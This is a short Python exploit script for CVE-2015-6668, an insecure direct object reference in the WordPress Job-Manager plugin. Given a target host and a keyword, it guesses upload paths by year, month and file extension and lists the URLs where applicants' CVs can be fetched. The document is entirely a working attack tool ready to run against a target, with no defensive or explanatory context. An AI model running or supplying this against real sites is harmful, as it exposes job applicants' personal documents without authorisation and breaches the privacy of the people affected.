#!/usr/bin/python3

import requests
import argparse
import sys

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2015-6668: WordPress Plugin (Job-Manager) CV IDOR")
    parser.add_argument("-r", "--rhost", help="Target IP/Domain")
    parser.add_argument("-p", "--rport", help="Target port", type=int, default=80)
    parser.add_argument("-k", "--keyword", help="CV keyword")
    args = parser.parse_args()
    rhost = args.rhost
    rport = args.rport
    keyword= args.keyword
    if len(sys.argv) < 2:
        print("[+] Arguments required! Please use -h for more details.")
    else:
        if rhost and rport and keyword is not None:
            keyword = keyword.replace(" ", "_")
            i = 1
            print("[+] URL of CV found:")
            for year in range(2016,2022):
                for month in range(1,13):
                    for extension in {'jpg','jpeg','docx', 'png', 'pdf'}:
                        url = f"http://{rhost}/wp-content/uploads/{str(year)}/{month:02}/{keyword}.{extension}"
                        req = requests.get(url, verify=False)
                        if req.status_code == 200:
                            print(f"{i}. {url}")
                            i += i
        else:
            print("[+] Missing arguments!")